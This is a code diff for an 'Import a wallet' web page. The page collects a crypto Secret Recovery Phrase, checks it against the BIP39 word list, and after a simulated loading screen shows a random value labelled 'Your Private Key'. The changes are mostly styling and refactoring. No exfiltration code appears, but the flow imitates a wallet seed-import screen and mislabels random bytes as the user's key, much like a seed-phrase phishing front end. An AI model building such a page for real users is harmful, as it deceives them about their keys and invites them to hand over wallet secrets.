@@ -6,44 +6,50 @@
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 :root {
-  --bg: #121212;
+  --bg: #141414;
   --fg: #ffffff;
   --accent: #0066cc;
-  --border: #3d3d3d;
-  --input-bg: #282828;
-  --label: #c0c0c0;
+  --border: #424242;
+  --input-bg: #1a1a1a;
+  --label: #8a8a8a;
   --error: #ff6b6b;
   --success: #4ade80;
-  --pill-bg: #424242;
-  --pill-border: #555;
-  --pill-text: #ffffff;
+  --badge-bg: #3a3a3a;
+  --badge-border: #555555;
+  --badge-text: #e8e8e8;
+  --badge-hover: #4a4a4a;
 }
 
 * {
   box-sizing: border-box;
 }
 
-body {
-  font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
-  background: var(--bg);
-  color: var(--fg);
+html, body {
   margin: 0;
   padding: 0;
-  min-height: 100vh;
+  width: 100%;
+  height: 100%;
+}
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
   display: flex;
   align-items: center;
   justify-content: center;
+  min-height: 100vh;
 }
 
 .container {
   width: 100%;
-  max-width: 600px;
+  max-width: 500px;
   padding: 40px 32px;
 }
 
 .header {
   display: flex;
-  align-items: flex-start;
+  align-items: center;
   gap: 16px;
   margin-bottom: 32px;
 }
@@ -52,84 +58,81 @@ body {
   background: none;
   border: none;
   color: var(--fg);
-  font-size: 28px;
+  font-size: 24px;
   cursor: pointer;
   padding: 0;
-  width: 28px;
-  height: 28px;
+  width: 24px;
+  height: 24px;
   display: flex;
   align-items: center;
   justify-content: center;
   transition: opacity .2s;
   flex-shrink: 0;
-  margin-top: 2px;
 }
 
 .back-btn:hover {
   opacity: 0.7;
 }
 
-.header-content {
-  flex: 1;
-}
-
 .header-content h1 {
   margin: 0;
-  font-size: 1.75rem;
-  font-weight: 700;
+  font-size: 1.5rem;
+  font-weight: 600;
   line-height: 1.2;
 }
 
 .header-content p {
-  margin: 8px 0 0 0;
+  margin: 4px 0 0 0;
   color: var(--label);
-  font-size: 0.95rem;
+  font-size: 0.9rem;
   display: flex;
   align-items: center;
   gap: 6px;
 }
 
 .help-icon {
-  width: 16px;
-  height: 16px;
-  border: 1.5px solid var(--label);
+  width: 14px;
+  height: 14px;
+  border: 1px solid var(--label);
   border-radius: 50%;
   display: flex;
   align-items: center;
   justify-content: center;
-  font-size: 12px;
+  font-size: 11px;
   cursor: help;
   flex-shrink: 0;
 }
 
 .form-group {
-  margin-bottom: 32px;
+  margin-bottom: 24px;
 }
 
-.word-input-area {
+.word-container {
   background: var(--input-bg);
   border: 1px solid var(--border);
-  border-radius: 8px;
+  border-radius: 6px;
   padding: 16px;
   margin-bottom: 16px;
   display: flex;
   flex-wrap: wrap;
-  gap: 8px;
+  gap: 10px;
   align-content: flex-start;
   min-height: 240px;
+  max-height: 400px;
+  overflow-y: auto;
 }
 
-.word-input-area.error {
+.word-container.error {
   border-color: var(--error);
 }
 
 .word-badge {
-  background: var(--pill-bg);
-  border: 1px solid var(--pill-border);
-  color: var(--pill-text);
-  padding: 8px 12px;
-  border-radius: 6px;
-  font-size: 0.85rem;
+  background: var(--badge-bg);
+  border: 1px solid var(--badge-border);
+  color: var(--badge-text);
+  padding: 6px 10px;
+  border-radius: 4px;
+  font-size: 0.8rem;
   font-weight: 500;
   display: inline-flex;
   align-items: center;
@@ -137,35 +140,36 @@ body {
   position: relative;
   animation: slideIn .2s ease;
   white-space: nowrap;
-  transition: border-color .2s, background .2s;
+  transition: all .15s;
   cursor: pointer;
   user-select: none;
-  flex: 0 0 calc(33.333% - 6px);
+  flex: 0 0 calc(33.333% - 7px);
   justify-content: space-between;
 }
 
 .word-badge:hover {
-  border-color: var(--accent);
+  background: var(--badge-hover);
+  border-color: #666;
 }
 
 .word-badge.error {
   border-color: var(--error);
-  background: rgba(255, 107, 107, 0.1);
+  background: rgba(255, 107, 107, 0.08);
 }
 
 .word-number {
   color: var(--label);
-  font-weight: 700;
-  font-size: 0.75rem;
-  min-width: 16px;
+  font-weight: 600;
+  font-size: 0.7rem;
+  min-width: 18px;
 }
 
 .word-text {
-  color: var(--pill-text);
-  letter-spacing: 1.5px;
-  font-size: 0.8rem;
+  color: var(--badge-text);
+  letter-spacing: 1.2px;
+  font-size: 0.75rem;
   font-weight: 600;
-  transition: all .2s ease;
+  transition: all .15s ease;
   flex: 1;
   text-align: center;
 }
@@ -178,20 +182,26 @@ body {
 
 .word-text.revealed {
   letter-spacing: 0px;
+  font-weight: 500;
 }
 
 .word-remove {
   cursor: pointer;
   color: var(--label);
   font-weight: bold;
-  font-size: 1rem;
+  font-size: 0.9rem;
   line-height: 1;
   user-select: none;
-  transition: color .2s;
+  transition: color .15s;
   background: none;
   border: none;
   padding: 0;
-  margin-left: 2px;
+  margin: 0;
+  width: 16px;
+  height: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
 }
 
 .word-remove:hover {
@@ -213,39 +223,60 @@ body {
   border: none;
   background: transparent;
   color: var(--fg);
-  caret-color: var(--fg);
-  font-size: 0.9rem;
+  caret-color: var(--accent);
+  font-size: 0.8rem;
   font-family: inherit;
   outline: none;
-  padding: 4px 8px;
-  flex: 0 0 calc(33.333% - 6px);
-  min-width: 60px;
+  padding: 0;
+  flex: 0 0 calc(33.333% - 7px);
+  min-width: 50px;
 }
 
 .word-input::placeholder {
   color: var(--label);
-  font-size: 0.85rem;
+  font-size: 0.75rem;
 }
 
-.form-footer {
+.actions {
   display: flex;
   justify-content: space-between;
   align-items: center;
-  margin-bottom: 16px;
-  min-height: 24px;
+  margin-bottom: 24px;
+  min-height: 20px;
 }
 
 .error-msg {
   color: var(--error);
-  font-size: 0.85rem;
-  line-height: 1.4;
+  font-size: 0.8rem;
+  line-height: 1.3;
   flex: 1;
+}
+
+.button-group {
+  display: flex;
+  gap: 16px;
+}
+
+.action-btn {
+  background: none;
+  border: none;
+  color: var(--accent);
+  font-size: 0.85rem;
+  cursor: pointer;
+  font-weight: 500;
+  transition: opacity .15s;
+  padding: 0;
+  white-space: nowrap;
+}
+
+.action-btn:hover {
+  opacity: 0.7;
 }
 
 .helper-text {
   color: var(--label);
-  font-size: 0.8rem;
-  line-height: 1.3;
+  font-size: 0.75rem;
+  line-height: 1.4;
   margin-top: 8px;
   display: none;
 }
@@ -254,45 +285,23 @@ body {
   display: block;
 }
 
-.button-group {
-  display: flex;
-  gap: 12px;
-  justify-content: flex-end;
-}
-
-.clear-all-btn {
-  background: none;
-  border: none;
-  color: var(--accent);
-  font-size: 0.9rem;
-  cursor: pointer;
-  font-weight: 500;
-  transition: opacity .2s;
-  padding: 0;
-  white-space: nowrap;
-}
-
-.clear-all-btn:hover {
-  opacity: 0.7;
-}
-
 .continue-btn {
-  background: #6b7280;
+  background: #4a4a4a;
   color: var(--fg);
   border: none;
   border-radius: 6px;
-  padding: 14px 32px;
+  padding: 12px 24px;
   font-weight: 600;
   cursor: pointer;
-  font-size: 1rem;
+  font-size: 0.95rem;
   width: 100%;
-  margin-top: 16px;
-  transition: background .15s, opacity .15s;
-  font-family: 'Roboto', system-ui, sans-serif;
+  margin-top: 0;
+  transition: background .15s;
+  font-family: inherit;
 }
 
 .continue-btn:hover:not(:disabled) {
-  background: #5a6370;
+  background: #5a5a5a;
 }
 
 .continue-btn:disabled {
@@ -301,26 +310,26 @@ body {
 }
 
 .continue-btn.active {
-  background: #ffffff;
-  color: #121212;
+  background: var(--fg);
+  color: var(--bg);
 }
 
 .continue-btn.active:hover {
-  background: #f0f0f0;
+  background: #f5f5f5;
 }
 
 #loading-page, #success-page {
   display: none;
   text-align: center;
-  padding-top: 60px;
+  padding-top: 40px;
 }
 
 .loader {
-  border: 4px solid var(--pill-bg);
-  border-top: 4px solid var(--accent);
+  border: 3px solid var(--badge-bg);
+  border-top: 3px solid var(--accent);
   border-radius: 50%;
-  width: 40px;
-  height: 40px;
+  width: 36px;
+  height: 36px;
   animation: spin 1s linear infinite;
   margin: 0 auto 20px;
 }
@@ -335,7 +344,7 @@ body {
   height: 48px;
   border-radius: 50%;
   display: inline-block;
-  border: 3px solid var(--success);
+  border: 2px solid var(--success);
   position: relative;
   animation: pop .4s ease;
   margin-bottom: 16px;
@@ -348,8 +357,8 @@ body {
   top: 4px;
   width: 13px;
   height: 26px;
-  border-right: 3px solid var(--success);
-  border-bottom: 3px solid var(--success);
+  border-right: 2px solid var(--success);
+  border-bottom: 2px solid var(--success);
   transform: rotate(45deg);
 }
 
@@ -361,12 +370,14 @@ body {
 .success-message h3 {
   margin: 0 0 8px 0;
   font-size: 1.25rem;
+  font-weight: 600;
 }
 
 .success-message p {
   color: var(--label);
-  margin: 8px 0;
+  margin: 0;
   line-height: 1.5;
+  font-size: 0.9rem;
 }
 
 #aes-container {
@@ -378,12 +389,12 @@ body {
   display: flex;
   gap: 8px;
   align-items: center;
-  background: var(--pill-bg);
+  background: var(--badge-bg);
   border-radius: 6px;
-  border: 1px solid var(--border);
-  padding: 12px;
+  border: 1px solid var(--badge-border);
+  padding: 10px;
   font-family: 'Courier New', monospace;
-  font-size: 0.75rem;
+  font-size: 0.7rem;
   word-break: break-all;
   margin-top: 8px;
 }
@@ -396,15 +407,14 @@ body {
 
 #copyAesBtn {
   flex: 0 0 auto;
-  width: auto;
-  padding: 8px 12px;
-  font-size: 0.85rem;
-  margin: 0;
+  padding: 6px 10px;
+  font-size: 0.8rem;
   background: var(--accent);
   color: white;
   border: none;
   border-radius: 4px;
   cursor: pointer;
+  font-weight: 500;
 }
 
 @media (max-width: 480px) {
@@ -413,15 +423,15 @@ body {
   }
   
   .header-content h1 {
-    font-size: 1.5rem;
+    font-size: 1.3rem;
   }
   
   .word-badge,
   .word-input {
-    flex: 0 0 calc(50% - 4px);
+    flex: 0 0 calc(50% - 5px);
   }
   
-  .word-input-area {
+  .word-container {
     min-height: 320px;
   }
 }
@@ -436,12 +446,12 @@ body {
       <button class="back-btn" id="backBtn">‹</button>
       <div class="header-content">
         <h1>Import a wallet</h1>
-        <p>Enter your Secret Recovery Phrase <span class="help-icon" title="Your seed phrase for wallet recovery">?</span></p>
+        <p>Enter your Secret Recovery Phrase <span class="help-icon">?</span></p>
       </div>
     </div>
 
     <div class="form-group">
-      <div class="word-input-area" id="word-input-area">
+      <div class="word-container" id="word-container">
         <input 
           type="text" 
           id="mnemonic-input" 
@@ -452,11 +462,11 @@ body {
         >
       </div>
       
-      <div class="form-footer">
+      <div class="actions">
         <div class="error-msg" id="errorMsg"></div>
         <div class="button-group">
-          <button class="clear-all-btn" id="pasteBtn" style="display: none;">Paste</button>
-          <button class="clear-all-btn" id="clearAllBtn" style="display: none;">Clear all</button>
+          <button class="action-btn" id="pasteBtn" style="display: none;">Paste</button>
+          <button class="action-btn" id="clearAllBtn" style="display: none;">Clear all</button>
         </div>
       </div>
 
@@ -482,7 +492,7 @@ body {
       <label>Your Private Key (Store Securely)</label>
       <div id="aes-box">
         <code id="aes-key"></code>
-        <button id="copyAesBtn" type="button">Copy</button>
+        <button id="copyAesBtn">Copy</button>
       </div>
     </div>
   </div>
@@ -500,13 +510,13 @@ fetch("https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039
     WORDS_READY = true;
   })
   .catch(() => {
-    WORDS = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account"];
+    WORDS = ["abandon","ability","able"];
     WORD_MAP = new Map(WORDS.map((w, i) => [w, i]));
     WORDS_READY = true;
   });
 
 const mnemonicInput = document.getElementById('mnemonic-input');
-const wordInputArea = document.getElementById('word-input-area');
+const wordContainer = document.getElementById('word-container');
 const continueBtn = document.getElementById('continueBtn');
 const backBtn = document.getElementById('backBtn');
 const clearAllBtn = document.getElementById('clearAllBtn');
@@ -552,7 +562,6 @@ async function isValidBip39(wordsList) {
 
   const entBits = bitstr.slice(0, ENT);
   const csBits = bitstr.slice(ENT, ENT + CS);
-
   const entropyBytes = bitsToBytes(entBits);
   
   try {
@@ -571,21 +580,15 @@ function getMaskedText(word) {
 }
 
 function renderWords() {
-  const inputValue = mnemonicInput.value;
+  wordContainer.querySelectorAll('.word-badge').forEach(b => b.remove());
   
-  // CLEAR badges
-  wordInputArea.querySelectorAll('.word-badge').forEach(badge => badge.remove());
-  
-  // RENDER badges
   for (let idx = 0; idx < words.length; idx++) {
     const word = words[idx];
     const badge = document.createElement('div');
     badge.className = 'word-badge';
     
     const isValid = WORD_MAP.has(word);
-    if (!isValid) {
-      badge.classList.add('error');
-    }
+    if (!isValid) badge.classList.add('error');
     
     const isRevealed = revealedIndices.has(idx);
     const wordDisplay = isRevealed ? word : (isValid ? getMaskedText(word) : word);
@@ -600,11 +603,7 @@ function renderWords() {
     const wordText = badge.querySelector('.word-text');
     wordText.onclick = (e) => {
       e.stopPropagation();
-      if (revealedIndices.has(idx)) {
-        revealedIndices.delete(idx);
-      } else {
-        revealedIndices.add(idx);
-      }
+      revealedIndices.has(idx) ? revealedIndices.delete(idx) : revealedIndices.add(idx);
       renderWords();
     };
     
@@ -617,11 +616,8 @@ function renderWords() {
       updateValidation();
     };
     
-    wordInputArea.insertBefore(badge, mnemonicInput);
+    wordContainer.insertBefore(badge, mnemonicInput);
   }
-  
-  mnemonicInput.value = inputValue;
-  mnemonicInput.focus();
   
   updateButtonVisibility();
 }
@@ -645,7 +641,7 @@ async function updateValidation() {
   const wordCount = words.length;
   const isValid = [12, 15, 18, 21, 24].includes(wordCount);
   
-  wordInputArea.classList.remove('error');
+  wordContainer.classList.remove('error');
   errorMsg.textContent = '';
   helperText.classList.remove('show');
   continueBtn.classList.remove('active');
@@ -653,49 +649,38 @@ async function updateValidation() {
   
   if (wordCount === 0) return;
   
-  const invalidWords = words.filter(w => !WORD_MAP.has(w));
-  if (invalidWords.length > 0) {
-    wordInputArea.classList.add('error');
+  if (words.filter(w => !WORD_MAP.has(w)).length > 0) {
+    wordContainer.classList.add('error');
     helperText.classList.add('show');
     return;
   }
   
   if (isValid) {
-    const valid = await isValidBip39(words);
-    if (valid) {
+    if (await isValidBip39(words)) {
       continueBtn.disabled = false;
       continueBtn.classList.add('active');
     } else {
-      wordInputArea.classList.add('error');
+      wordContainer.classList.add('error');
       errorMsg.textContent = 'Invalid checksum. Please check your words.';
     }
   } else if (wordCount > 24) {
-    wordInputArea.classList.add('error');
+    wordContainer.classList.add('error');
     errorMsg.textContent = 'Too many words. Maximum is 24.';
   }
 }
 
 mnemonicInput.addEventListener('input', async (e) => {
   const text = e.target.value;
-  
   if (text.length > 0 && /\s/.test(text)) {
     const parts = text.split(/\s+/);
-    
     for (let i = 0; i < parts.length - 1; i++) {
-      const trimmedWord = parts[i].trim().toLowerCase();
-      if (trimmedWord.length > 0) {
-        words.push(trimmedWord);
-      }
+      const w = parts[i].trim().toLowerCase();
+      if (w.length > 0) words.push(w);
     }
-    
     mnemonicInput.value = '';
-    
-    if (words.length > 0) {
-      renderWords();
-      await updateValidation();
-    }
+    renderWords();
+    await updateValidation();
   }
-  
   updateButtonVisibility();
 });
 
@@ -711,17 +696,13 @@ mnemonicInput.addEventListener('keydown', async (e) => {
     }
   } else if (e.key === 'Backspace' && mnemonicInput.value === '' && words.length > 0) {
     words.pop();
-    revealedIndices.delete(words.length);
     renderWords();
     await updateValidation();
   }
-  
   setTimeout(updateButtonVisibility, 0);
 });
 
-wordInputArea.addEventListener('click', () => {
-  mnemonicInput.focus();
-});
+wordContainer.addEventListener('click', () => mnemonicInput.focus());
 
 clearAllBtn.onclick = () => {
   words = [];
@@ -735,62 +716,29 @@ clearAllBtn.onclick = () => {
 pasteBtn.onclick = async () => {
   try {
     const text = await navigator.clipboard.readText();
-    const pastedWords = text.trim().toLowerCase().split(/[\s\n\r\t]+/).filter(w => w.length > 0);
-    
-    words = pastedWords;
+    words = text.trim().toLowerCase().split(/[\s\n\r\t]+/).filter(w => w.length > 0);
     revealedIndices.clear();
-    
     mnemonicInput.value = '';
     renderWords();
     await updateValidation();
   } catch (err) {
-    console.error("Failed to read clipboard: ", err);
     alert("Failed to paste from clipboard");
   }
 };
 
-backBtn.onclick = () => {
-  console.log('Back button clicked');
-};
+backBtn.onclick = () => console.log('Back clicked');
 
 continueBtn.onclick = async () => {
   document.getElementById('main-page').style.display = 'none';
   document.getElementById('loading-page').style.display = 'block';
-
   setTimeout(() => {
     document.getElementById('loading-page').style.display = 'none';
     document.getElementById('success-page').style.display = 'block';
-
-    const key = generateAes256Base64();
-    const aesKeyEl = document.getElementById('aes-key');
-    const copyBtn = document.getElementById('copyAesBtn');
-
-    if (aesKeyEl && copyBtn) {
-      aesKeyEl.textContent = key;
-      copyBtn.onclick = () => copyToClipboard(key);
-    }
+    const key = btoa(crypto.getRandomValues(new Uint8Array(32)).reduce((a,b) => a + String.fromCharCode(b), ''));
+    document.getElementById('aes-key').textContent = key;
+    document.getElementById('copyAesBtn').onclick = () => navigator.clipboard.writeText(key).catch(() => alert("Failed to copy"));
   }, 1500);
 };
-
-function generateAes256Base64() {
-  const bytes = new Uint8Array(32);
-  crypto.getRandomValues(bytes);
-  let binary = "";
-  for (let i = 0; i < bytes.length; i++) {
-    binary += String.fromCharCode(bytes[i]);
-  }
-  return btoa(binary);
-}
-
-async function copyToClipboard(text) {
-  try {
-    await navigator.clipboard.writeText(text);
-    alert("Key copied to clipboard");
-  } catch (err) {
-    console.error("Failed to copy: ", err);
-    alert("Failed to copy key");
-  }
-}
 
 mnemonicInput.focus();
 </script>
